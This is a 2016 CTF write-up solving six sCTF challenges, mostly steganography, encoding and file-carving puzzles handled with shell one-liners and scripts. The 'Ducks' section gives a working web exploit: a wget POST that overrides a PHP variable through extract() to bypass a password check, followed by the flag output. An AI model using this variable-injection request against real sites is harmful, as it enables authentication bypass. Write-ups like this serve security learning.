Title: Write-Up - sCTF.io - 2016Q1
Date: 2016-04-17 00:00
Modified: 2016-04-17 00:00
Category: CTF
Tags: ctf, write-up, sctf
Slug: writeup-sctf-2016q1
Authors: atcasanova
Summary: Write-Up do sCTF 2016Q1

#[Ducks](https://github.com/318br/sctf/tree/master/2016q1/Ducks)

##[The ducks](http://ducks.sctf.michaelz.xyz/) and I have a unfinished score to settle.

Hint: If you've remember HSF, you'll know that The Ducks is unsolvable.


This one was quite easy: since it gave us the [source code of the page](http://ducks.sctf.michaelz.xyz/source.php) we could see that it uses the [PHP extract()](http://stackoverflow.com/questions/829407/what-is-so-wrong-with-extract) function.

Our goal was then to send a POST that would override the `thepassword_123` variable:


`wget -qO- --post-data="pass=abc&thepassword_123=abc" http://ducks.sctf.michaelz.xyz/`

and within the output, there it is:

```html
<h1>The Ducks</h1>
<div class="alert alert-success">
<code>sctf{maybe_i_shouldn't_have_extracted_everything_huh}</code>
</div>
```
---
#[LenghtyLingo](https://github.com/318br/sctf/blob/master/2016q1/LengthyLingo/README.md)
## Description:
Can you crack the code? We intercepted this flag but can't seem to figure out how it was encrypted.

The solution is quite simple. You have to count the length of each word, then convert its number to ascii.
I've came up with this one-liner:

```bash
sed 's/, /\n/g' encrypted.dat | while read i; do printf "\x$(printf %x ${#i})"; done
```
---
#[Rain Or Shine](https://github.com/318br/sctf/tree/master/2016q1/RainOrShine)

This one we couldn't crack in time, mostly because I first found a JPEG signature which turned out to be just the thumbnail of the original image, what cost us a lot of time, and also because GIMP wouldn't open layered TIFFs. 

Because of this, we spent a lot of time trying to manually reassemble the QR Code, which was impossible since there were overlayed layers.

By the time I got access to a friend with Photoshop, the challenge was ended.

Cutting to the chase: Open the `rain.wav` file in your favourite hex editor (mine is bless). Keep digging until you find a TIFF header:

**49492a0008**

So what we'll have to do is cut the file from this header until the end: 

```bash
xxd -p rain.wav | tr -d '\n' | grep -Eo "49492a0008[0-9a-f]*" | xxd -r -p > file.tiff
```
and then open it with Photoshop (GIMP apparently has some issues managing layered TIFFs), where you can see four layers and easily rearrange them.

The result is a QRCode that you could read with your phone or using zbar-tools

---
#[Verticode](https://github.com/318br/sctf/tree/master/2016q1/Verticode)
##Description:

Welcome to Verticode, the new method of translating text into vertical codes.

Each verticode has two parts: the color shift and the code.

The code takes the inputted character and translates it into an ASCII code, and then into binary, then puts that into an image in which each black pixel represents a 1 and each white pixel represents a 0.

For example, A is 65 which is 1000001 in binary, B is 66 which is 1000010, and C is 67 which is 1000011, so the corresponding verticode would look like this.

Except, it isn't that simple.

A color shift is also integrated, which means that the color before each verticode shifts the ASCII code, by adding the number that the color corresponds to, before translating it into binary. In that case, the previous verticode could also look like this.

The table for the color codes is:

| Value | Color |
| ----- | ----- |
| 0 | Red |
| 1 | Purple |
| 2 | Blue |
| 3 | Green |
| 4 | Yellow |
| 5 | Orange |

This means that a red color shift for the letter A, which is 65 + 0 = 65, would translate into 1000001 in binary; however, a green color shift for the letter A, which is 65 + 3 = 68, would translate into 1000100 in binary.

Given this verticode, read the verticode into text and find the flag.

Note that the flag will not be in the typical sctf{flag} format, but will be painfully obvious text. Once you find this text, you will submit it in the sctf{text} format. So, if the text you find is adunnaisawesome, you will submit it as sctf{adunnaisawesome}.

# decode.sh

```bash
#!/bin/bash
(( $# != 1 )) && { echo "please specify input file"; exit 1; }

# constants:
line_height=12
pixel_width=12
line_width=168
color_width=83

# convert png to txt using ImageMagick's convert
convert $1 txt: > out.txt
sed -i '1d' out.txt
lines=$(tail -1 out.txt | cut -f2 -d, | cut -f1 -d:)

# get just one line of pixels for each real line in the image
for (( i=0; i<$lines; i+=$line_height )); do 
	grep -E "^[0-9]*,$i: " out.txt ; 
done > lines.txt

# get just one pixel per needed column in the original image
>sane.txt
for i in $(cat lines.txt | cut -f2 -d, | cut -f1 -d: | sort -nu); do
	for (( j=$color_width; j<$line_width; j+=$pixel_width )); do 
		grep "^$j,$i: " lines.txt >> sane.txt
	done
done 

# each "line" in one line
cat sane.txt | tr -s ' ' | sed 's/, /,/g;s/( /(/g' | cut -f4 -d " " | xargs -L8 > end.txt

# black and white to binary
sed 's/ black/1/g;s/ white/0/g' end.txt | sed 's/^[a-z]*/\0 /g' >ideal.txt

# binary conversion, color conversion and mathematics, then print ascii code
paste -d-  <(for i in $(cat ideal.txt | cut -f2 -d" "); do echo $((2#$i)); done) ideal.txt > last.txt
for i in $(cat last.txt | cut -f1 -d" " | sed 's|red|0|g;s|purple|1|g;s|blue|2|g;s|green|3|g;s|yellow|4|g;s|orange|5|g'| bc); do 
	printf "\x$(printf %x $i)";
done
echo
```
## Running:
`chmod +x decode.sh`
then
`./decode.sh code1.png`

Sorry about the great number of temporary files, but I did this step by step on the shell :)

---
#[Vertinet](https://github.com/318br/sctf/tree/master/2016q1/Vertinet)
#Description:
This problem follows the same specifications as the previous Verticode, except that you have to solve many of them by developing a client to communicate with the server available at problems1.2016q1.sctf.io:50000. Good luck.

#client.sh
```bash
start=0;
print=0;
while read -n1 char;
do
		(( $print == 1 )) && echo -n $char;
		if [ "$char" == "," ]; then
			start=1; continue;
 		fi
		if [ "$char" == "'" ]; then
			start=0;
		fi
		(( $abriu == 1)) && {
			resp+=$char; 
		}
		if (( ${#resp} > 1500 )) && (( $abriu == 0 )); then
			echo -n "${resp}" | base64 -d >/dev/null && {
				echo -n "${resp}" | base64 -d > file.png
				print=1;
				answer=$(../Verticode/decode.sh file.png)
				echo -n $answer >&4
				resp=
			} || print=0;
		fi
done <&3
```

## Running

`chmod +x client.sh`

then

`socat TCP4:problems1.2016q1.sctf.io:50000 EXEC:/full/path/to/client.sh,fdin=3,fdout=4`

Maybe you'll need to install `socat` first

---------

#[Failed Compression](https://ctftime.org/task/2258)

This one was a pain in the *ss. I opened the file (compressed.zip, 73mb) and found a lot of JPEG JFIF broken headers, and also PNG IHDR ones.

I was REALLY bored to code something nice to extract all the files, so I thought I could use some luck this time. Then I focused on the JPEG files.

Before you continue, I'd like you to know that I'm not proud of the following lines ;)


##1. Convert the file to hex
`xxd -p compressed.zip | tr -d "\n" > hex`


##2. Make an ugly loop to isolate the JPEG markers within spaces using an uglier sed.

```bash
j=0; 
for i in $(cat hex | sed 's/e000104a/ STARTHERE/g;s/ae4260/ENDHERE /g'); do
	echo $i > $j.j;
	let j++;
done
```


##3. Loop all the files, now fixing the headers and footers, then converting back from hex to file.

```bash
for i in *.j ; do
	sed -i 's/STARTHERE/ffd8ffe000104a/g;s/ENDHERE/ae4260/g' $i;
	xxd -r -p $i > ${i}pg;
done
```


##4. For easy browsing, let's make a HTML file with all the valid JPEG files
```bash
for i in $(file *.jpg| grep JPEG | cut -f1 -d:); do
	echo "<img src='$i'>" >> index.html;
done
```


As I said, we needed luck. The flag was in one of the jpeg files :)
Take a look at 264.jpg

----------
